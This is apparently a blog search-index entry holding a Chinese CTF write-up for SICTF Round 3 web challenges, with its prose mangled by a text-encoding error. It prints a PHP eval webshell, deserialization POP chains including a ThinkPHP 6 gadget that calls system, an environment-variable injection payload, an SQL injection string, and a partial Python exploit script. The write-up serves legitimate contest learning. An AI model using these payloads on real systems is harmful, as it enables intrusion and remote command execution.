<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SICTF Round3</title>
      <link href="/SICTF_Round3/"/>
      <url>/SICTF_Round3/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p>æŠ¢åˆ°5ä¸ªä¸€è¡€ï¼Œä¸€ä¸ªäºŒè¡€ï¼ˆ</p><h2 id="100ï¼…-upload"><a href="#100ï¼…-upload" class="headerlink" title="100ï¼…_upload"></a>100ï¼…_upload</h2><p>è§‚å¯Ÿurlï¼Œæœ‰ä¸€ä¸ª<code>?file=upload.php</code>ï¼ŒçŒœæµ‹è¿™é‡Œå¯ä»¥æ–‡ä»¶åŒ…å«ã€‚</p><p>æ¥ç€æ˜¯ä¸Šä¼ æ–‡ä»¶ï¼Œè¿‡æ»¤äº†<code>php</code>ç­‰å…³é”®å­—ï¼Œæ–‡ä»¶åå¯ä»¥éšæ„ï¼Œä¸Šä¼ æˆåŠŸåå¾—åˆ°æ–‡ä»¶è·¯å¾„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=eval($_POST[1])?&gt;</span><br></pre></td></tr></table></figure><p><img src="/./SICTF_Round3/w_1_1.png"></p><p><code>?file=uploads/123.php.png</code> åŒ…å«åˆšåˆšä¸Šä¼ çš„æ–‡ä»¶ï¼Œå³å¯rceã€‚</p><p><img src="/./SICTF_Round3/w_1_2.png"></p><h2 id="Not-just-unserialize"><a href="#Not-just-unserialize" class="headerlink" title="Not just unserialize"></a>Not just unserialize</h2><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$welcome</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$you</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">begin0fweb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">begin0fweb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$p</span>=<span class="string">&#x27;hacker!&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;welcome-&gt;you = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$year</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;  Welcome to new year!  &#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable language_">$this</span>-&gt;year);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CR</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$last</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newyear</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;newyear)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/worries/i&#x27;</span>,<span class="variable">$this</span>-&gt;newyear))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;empty it!&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(worries).*$/&#x27;</span>,<span class="variable">$this</span>-&gt;newyear)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Don\&#x27;t be worry&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Worries doesn\&#x27;t exists in the new year  &#x27;</span>;</span><br><span class="line">            <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;last-&gt;worries);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ET</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>] <span class="keyword">as</span> <span class="variable">$inject</span> =&gt; <span class="variable">$rce</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$inject&#125;</span>=<span class="subst">&#123;$rce&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo \&quot;Haven&#x27;t you get the secret?\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;go&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;go&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>ET::__isset</code>å¯ä»¥ç¯å¢ƒå˜é‡æ³¨å…¥rceã€‚</p><p>å…ˆæ˜¯popé“¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start::__destruct =&gt; SE::__set =&gt; CR::__tostring =&gt; ET::__isset</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$welcome</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$you</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">begin0fweb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">begin0fweb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$p</span>=<span class="string">&#x27;hacker!&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;welcome-&gt;you = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$year</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;  Welcome to new year!  &#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable language_">$this</span>-&gt;year);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CR</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$last</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newyear</span>=<span class="string">&quot;\nworries&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__tostring&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;newyear)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/worries/i&#x27;</span>,<span class="variable">$this</span>-&gt;newyear))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;empty it!&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(worries).*$/&#x27;</span>,<span class="variable">$this</span>-&gt;newyear)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Don\&#x27;t be worry&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Worries doesn\&#x27;t exists in the new year  &#x27;</span>;</span><br><span class="line">            <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;last-&gt;worries);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ET</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>] <span class="keyword">as</span> <span class="variable">$inject</span> =&gt; <span class="variable">$rce</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$inject&#125;</span>=<span class="subst">&#123;$rce&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo \&quot;Haven&#x27;t you get the secret?\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">start</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;welcome=<span class="keyword">new</span> <span class="title function_ invoke__">SE</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;welcome-&gt;year = <span class="keyword">new</span> <span class="title function_ invoke__">CR</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;welcome-&gt;year-&gt;last = <span class="keyword">new</span> <span class="title function_ invoke__">ET</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Tzo1OiJzdGFydCI6Mjp7czo3OiJ3ZWxjb21lIjtPOjI6IlNFIjoxOntzOjQ6InllYXIiO086MjoiQ1IiOjI6e3M6NDoibGFzdCI7TzoyOiJFVCI6MDp7fXM6NzoibmV3eWVhciI7czo4OiIKd29ycmllcyI7fX1zOjM6InlvdSI7Tjt9</span></span><br></pre></td></tr></table></figure><p>æ¥ç€æ˜¯ä¸€äº›phpçš„ç‰¹æ€§ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;newyear)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/worries/i&#x27;</span>,<span class="variable">$this</span>-&gt;newyear))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;empty it!&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(worries).*$/&#x27;</span>,<span class="variable">$this</span>-&gt;newyear)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Don\&#x27;t be worry&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Worries doesn\&#x27;t exists in the new year  &#x27;</span>;</span><br><span class="line"><span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;last-&gt;worries);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥ç”¨å›è½¦æ¥æ»¡è¶³æ­£åˆ™çš„è¦æ±‚ï¼Œå³<code>\nworries</code>ã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">preg_matchç»•è¿‡æ€»ç»“</a></p><p>æœ€åæ˜¯ç¯å¢ƒå˜é‡æ³¨å…¥rceã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="http://tttang.com/archive/1450/">æˆ‘æ˜¯å¦‚ä½•åˆ©ç”¨ç¯å¢ƒå˜é‡æ³¨å…¥æ‰§è¡Œä»»æ„å‘½ä»¤</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET: get[BASH_FUNC_echo%25%25]=()%20&#123;%20cat%20/f*;%20&#125;</span><br><span class="line">POST: go=Tzo1OiJzdGFydCI6Mjp7czo3OiJ3ZWxjb21lIjtPOjI6IlNFIjoxOntzOjQ6InllYXIiO086MjoiQ1IiOjI6e3M6NDoibGFzdCI7TzoyOiJFVCI6MDp7fXM6NzoibmV3eWVhciI7czo4OiIKd29ycmllcyI7fX1zOjM6InlvdSI7Tjt9</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagã€‚</p><p><img src="/./SICTF_Round3/w_2_1.png"></p><h2 id="hacker"><a href="#hacker" class="headerlink" title="hacker"></a>hacker</h2><p>æŸ¥çœ‹æºç å¯ä»¥å¾—åˆ°æç¤º</p><p><img src="/./SICTF_Round3/w_3_1.png"></p><p>è¿‡æ»¤äº†<code>or</code>ï¼ŒæŸ¥ä¸äº†åˆ—åï¼Œç”¨æ— åˆ—åæ³¨å…¥</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/weixin_46330722/article/details/109605941">SQLæ³¨å…¥ä¹‹æ— åˆ—åæ³¨å…¥</a></p><p>â€‹<a href="https://blog.csdn.net/weixin_46330722/article/details/109531387">buuåšé¢˜ç¬”è®°â€”â€”[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb&amp;[SWPU2019]Web1</a></p><p>å‰é¢çš„æŸ¥è¡¨ååº“åè¿™äº›æ“ä½œå¯ä»¥ä¸ç”¨åšäº†ï¼Œç›´æ¥å¥—ç°æˆçš„payloadæŸ¥<code>flag</code>è¡¨å°±è¡Œäº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=flag&#x27;union/**/select/**/(select/**/group_concat(`2`)/**/from/**/(select/**/1,2/**/union/**/select*from/**/flag)n)%23</span><br></pre></td></tr></table></figure><p><img src="/./SICTF_Round3/w_3_2.png"></p><h2 id="EZ-SSRF"><a href="#EZ-SSRF" class="headerlink" title="EZ_SSRF"></a>EZ_SSRF</h2><p>ç”¨<code>fileåè®®</code>è¯»æ–‡ä»¶å°±è¡Œäº†ï¼Œè¯»<code>/var/www/html/flag.php</code>ã€‚ï¼ˆå‡ºé¢˜äººéª—æˆ‘ï¼Œè¯´flagåœ¨<code>/flag</code>ï¼‰</p><p><img src="/./SICTF_Round3/w_4_1.png"></p><p>base64è§£ç å¾—åˆ°flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;SICTF&#123;8ce2ea5d-82b5-4fe0-9d86-efe9a0df693a&#125;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Oyst3rPHP"><a href="#Oyst3rPHP" class="headerlink" title="Oyst3rPHP"></a>Oyst3rPHP</h2><p>thinkphp6.0*çš„ååºåˆ—åŒ–ã€<code>preg_match</code>å’Œmd5çš„ç‰¹æ€§ã€‚</p><p>é¦–å…ˆè®¿é—®<code>/www.zip</code>ï¼Œå¾—åˆ°æºç ï¼Œçœ‹æºç çš„<code>Readme.md</code>çŸ¥é“è¿™æ˜¯tp6ã€‚</p><p>éƒ¨åˆ†æºç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;RTï¼Œä¸€ä¸ªå¾ˆç®€å•çš„Webï¼Œç»™å¤§å®¶é€ä¸€ç‚¹åˆ†,å†é€ä¸‰åªç”Ÿèšï¼Œè¿‡å¹´ä¸€èµ·åƒç”Ÿèšå“ˆ&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../Oyster.png&#x27;&quot;</span>.<span class="string">&quot;/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">base64_decode</span>(@<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">        <span class="variable">$right</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;left&#x27;</span>];</span><br><span class="line">        <span class="variable">$left</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;right&#x27;</span>];</span><br><span class="line">        </span><br><span class="line"><span class="variable">$key</span> = (<span class="keyword">string</span>)@<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$right</span> !== <span class="variable">$left</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$right</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$left</span>))&#123;</span><br><span class="line">            </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Congratulations on getting your first oyster&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../Oyster1.png&#x27;&quot;</span>.<span class="string">&quot;/&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?THINKPHP/is&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Oysters don&#x27;t want you to eat&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$key</span>, <span class="string">&#x27;603THINKPHP&#x27;</span>) === <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;ï¼ï¼ï¼Oysters don&#x27;t want you to eatï¼ï¼ï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;WOWï¼ï¼ï¼Congratulations on getting your second oyster&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../Oyster2.png&#x27;&quot;</span>.<span class="string">&quot;/&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="comment">//æœ€åä¸€ä¸ªç”Ÿèšåœ¨æ ¹ç›®å½•ï¼Œè€Œä¸”é‡Œé¢æœ‰Flagï¼Ÿï¼Ÿï¼Ÿå’‹æ ·å»æ‰¾åˆ°å®ƒå‘¢ï¼Ÿï¼Ÿï¼Ÿå®ƒçš„åå­—æ˜¯ä»€ä¹ˆï¼Ÿï¼Ÿï¼Ÿ</span></span><br><span class="line"><span class="comment">//åœ¨æºç çš„æŸå¤„æ³¨é‡Šç»™å‡ºäº†æç¤ºï¼Œè¿™å°±çœ‹ä½ æ˜¯ä¸æ˜¯çœŸæ‡‚Oyst3rphpæ¡†æ¶å’¯ï¼ï¼ï¼</span></span><br><span class="line"><span class="comment">//å°Tipsï¼šç»†ç‹—å‡½æ•°â”—|ï½€Oâ€²|â”› å—·~~</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå…ˆæ˜¯md5å¼±æ¯”è¾ƒï¼Œç„¶ååˆ©ç”¨æ­£åˆ™å›æº¯æœ€å¤§æ¬¡æ•°ä¸Šé™ç»•è¿‡ <code>preg_match</code> ï¼Œæœ€åæ˜¯ååºåˆ—åŒ–ã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/yourdawntown/article/details/120558237">åˆ©ç”¨æ­£åˆ™å›æº¯æœ€å¤§æ¬¡æ•°ä¸Šé™ç»•è¿‡preg_match</a></p><p>ååºåˆ—åŒ–ç›´æ¥æ‹¿ç½‘ä¸Šç°æˆçš„popé“¾å°±è¡Œäº†ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">trait</span> <span class="title">Attribute</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$data</span> = [<span class="string">&quot;key&quot;</span>=&gt;<span class="string">&quot;cat /Oyst3333333r.php&quot;</span>]; <span class="comment">// è¿™é‡Œå¡«ä¸Šå‘½ä»¤</span></span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$withAttr</span> = [<span class="string">&quot;key&quot;</span>=&gt;<span class="string">&quot;system&quot;</span>];</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$lazySave</span> = <span class="literal">true</span>;</span><br><span class="line">     <span class="keyword">protected</span> <span class="variable">$withEvent</span> = <span class="literal">false</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">true</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$force</span> = <span class="literal">true</span>;</span><br><span class="line">     <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span>=<span class="string">&quot;&quot;</span></span>)</span>&#123;</span><br><span class="line">         <span class="variable language_">$this</span>-&gt;name=<span class="variable">$obj</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"> <span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"> </span>&#123;&#125;</span><br><span class="line"> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Pivot</span>();</span><br><span class="line"> <span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="variable">$a</span>);</span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">// TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjc6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjE4OiIAdGhpbmtcTW9kZWwAZm9yY2UiO2I6MTtzOjc6IgAqAG5hbWUiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo3OntzOjIxOiIAdGhpbmtcTW9kZWwAbGF6eVNhdmUiO2I6MTtzOjEyOiIAKgB3aXRoRXZlbnQiO2I6MDtzOjE5OiIAdGhpbmtcTW9kZWwAZXhpc3RzIjtiOjE7czoxODoiAHRoaW5rXE1vZGVsAGZvcmNlIjtiOjE7czo3OiIAKgBuYW1lIjtzOjA6IiI7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319</span></span><br></pre></td></tr></table></figure><p>å› ä¸ºå›æº¯æ¬¡æ•°ä¸Šé™é»˜è®¤æ˜¯ 100 ä¸‡ï¼Œå› æ­¤ç”¨pythonå†™è„šæœ¬å‘è¿‡å»ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://yuanshen.life:37255/?left=240610708&amp;right=s878926199a&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;key&quot;</span>:<span class="string">&#x27;a&#x27;</span>*<span class="number">1000100</span>+<span class="string">&quot;603THINKPHP&quot;</span>,<span class="string">&quot;payload&quot;</span>:<span 